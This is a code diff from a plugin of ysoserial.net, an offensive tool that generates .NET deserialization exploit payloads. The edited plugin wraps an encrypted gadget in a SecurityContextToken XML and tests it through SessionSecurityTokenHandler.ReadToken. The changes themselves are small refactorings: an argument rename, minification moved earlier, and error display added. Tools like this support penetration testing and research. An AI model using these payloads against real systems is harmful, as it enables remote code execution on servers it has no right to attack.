@@ -64,7 +64,7 @@ namespace ysoserial.Plugins
             try
             {
                 extra = options.Parse(args);
-                inputArgs.CmdFullString = command;
+                inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
                 inputArgs.Test = test;
@@ -76,7 +76,7 @@ namespace ysoserial.Plugins
                 Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                 System.Environment.Exit(-1);
             }
-            String payloadValue = "";
+
             string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
 	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
 		urn:unique-id:securitycontext:1
@@ -104,6 +104,12 @@ namespace ysoserial.Plugins
             byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
             payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));
 
+            
+            if (minify)
+            {
+                payload = XMLMinifier.Minify(payload, null, null);
+            }
+
             if (test)
             {
                 // PoC on how it works in practice
@@ -113,15 +119,10 @@ namespace ysoserial.Plugins
                     SessionSecurityTokenHandler mySessionSecurityTokenHandler = new SessionSecurityTokenHandler();
                     mySessionSecurityTokenHandler.ReadToken(tokenXML);
                 }
-                catch
+                catch (Exception err)
                 {
-                    // there will be an error!
+                    Debugging.ShowErrors(inputArgs, err);
                 }
-            }
-
-            if (minify)
-            {
-                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
